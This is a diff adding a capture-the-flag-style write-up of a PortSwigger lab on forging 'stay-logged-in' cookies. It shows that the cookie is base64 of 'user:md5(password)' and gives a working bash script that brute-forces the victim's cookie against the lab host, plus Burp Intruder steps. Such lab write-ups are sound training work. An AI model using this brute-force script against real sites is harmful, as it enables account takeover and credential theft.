@@ -396,6 +396,89 @@ And within 21 minutes, I had my 17xx MFA code.
 Lab solved.
 
 
+## LAB : Brute-forcing a stay-logged-in cookie
+
+Log in with the provided valid credentials (wiener / peter), and look at the storred cookies using the web inspector.\
+There is a cookies called *stay-logged-in*, and the value looks like a base64 string.
+
+Decoding it gives us:\
+```bash
+$ echo -n "<stay-logged-in cookie value>" | base64 -d
+wiener:<new random string>
+$
+```
+{: .nolineno}
+
+And this gives us a new random string, which looks like another base64 string.\
+However, using the same command, gives us some weird stuff:\
+```bash
+$ echo -n "<new random string>" | base64 -d
+�W\�G]s��w���Mu{כm��k��
+$
+```
+{: .nolineno}
+
+Another option that it could be, is an MD5-hash. But of what...\
+Well:\
+```bash
+$ echo -n "peter" | md5sum
+<new random string>
+$
+```
+{: .nolineno}
+
+Seems it's just an MD5-hash of our password.
+
+We know the victims username (carlos), and we have our sample password list, so we can brute-force this stay-logged-in cookie:\
+```bash
+#!/bin/bash
+
+HOST="0ad200a40406059281498f0d00e000a5.web-security-academy.net"
+USERNAME="carlos"
+PWLIST="/usr/share/wordlists/portswigger/portswigger-passwords.txt"
+COOKIE_TEMPLATE="${HOST}	FALSE	/	FALSE	0	stay-logged-in	"
+
+
+for pw in $(cat ${PWLIST}); do
+
+  echo "$pw"
+
+  MD5PW=$(echo -n ${pw} | md5sum | awk '{ print $1 }')
+  COOKIE_VALUE=$(echo -n "${USERNAME}:${MD5PW}" | base64)
+  echo "${COOKIE_TEMPLATE}${COOKIE_VALUE}" > cookie.txt
+
+  # Try to go to the my-account page with the brute-forced cookie. If we see a Log out link, we're in.
+  CHK=$(wget -qO- --load-cookies cookie.txt "https://${HOST}/my-account?id=${USERNAME}" | grep -i "log out")
+
+  # If we see the "log out" link, we are logged in!
+  if [[ "${CHK}" != "" ]]; then
+    echo "!!!! FOUND THE PASSWORD:      $pw"
+    break
+  fi
+
+
+done
+```
+{: .nolineno}
+And this script provides us with the password, which we can now use to login as carlos.
+
+And of course, we could've done this with Burpsuite:
+* Login to the site, using the known credentials, and check the 'stay logged in' checkbox.
+* capture the request of the 'my-account' page while being logged in as wiener. And send it to intruder.
+* Change the request url "GET /", remove the POST-data.
+* Only add a payload to the 'stay-logged-in' cookie value.
+* In the payloads tab, use a simple list, and load the password samples.
+* In the payload processing, add 3 rules in this order:
+  * Hash: MD5
+  * Add Prefix:  carlos:    (don't forget the : behind the username)
+  * Base64-encode
+* Start the attack
+
+There is one response with a different length. This is your password.
+
+
+
+
 ## Credits
 
 Header image by [freepik](https://www.freepik.com/free-vector/gradient-ssl-illustration_22112339.htm)
